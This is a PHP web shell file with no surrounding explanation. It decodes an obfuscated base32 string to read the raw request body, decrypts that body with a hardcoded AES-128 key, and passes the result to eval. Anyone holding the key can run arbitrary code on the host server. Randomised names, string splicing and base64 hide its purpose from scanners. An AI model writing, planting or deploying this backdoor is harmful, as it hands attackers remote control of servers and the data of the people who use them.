<?php
@error_reporting(0);
session_start();
    $DKTN="e45e329feb5d925b"; 
    $_SESSION['k']=$DKTN;
    session_write_close();
    $WZTU="obuhaorpf5uw44dvoq";
    $RBES='openssl';
    $VRDO=RUXT($WZTU);
    $BUWV=file_get_contents($VRDO);
    $DAYG=base64_decode('JEJVV1Y9b3BlbnNzbF9kZWNyeXB0KCRCVVdWLCAnQUVTMTI4JywgJERLVE4pOw==');
    if(!extension_loaded($RBES))
    {
		$ZNPA=substr_replace("base6hdaaskjdhkjsahjdksak","4_decode",5);
        $BUWV=$ZNPA("/*@pDWaTJ*/".$BUWV);
        
        for($i=0;$i<strlen($BUWV);$i++) {
                 
                }
    }
    else
    {
        eval($DAYG);
    }
    $DZUG=explode('|',$BUWV);
    $YBDC=$DZUG[0];
    $PDQA=$DZUG[1];
    class JTCN{public function __invoke($p) {eval("/*@pDWaTJ*/".$p."");}}
    @call_user_func(new JTCN(),$PDQA);
    function RUXT($MKDI){
    $BLZR = '';
    $OKDH = 0;
    $AJQG = 0;
    for ($i = 0, $j = strlen($MKDI); $i < $j; $i++){
        $OKDH <<= 5;
        if ($MKDI[$i] >= 'a' && $MKDI[$i] <= 'z'){
            $OKDH += (ord($MKDI[$i]) - 97);
        } elseif ($MKDI[$i] >= '2' && $MKDI[$i] <= '7') {
            $OKDH += (24 + $MKDI[$i]);
        } else {
            exit(1);
        }
        $AJQG += 5;
        while ($AJQG >= 8){
            $AJQG -= 8;
            $BLZR .= chr($OKDH >> $AJQG);
            $OKDH &= ((1 << $AJQG) - 1);}}
    return $BLZR;}

?>
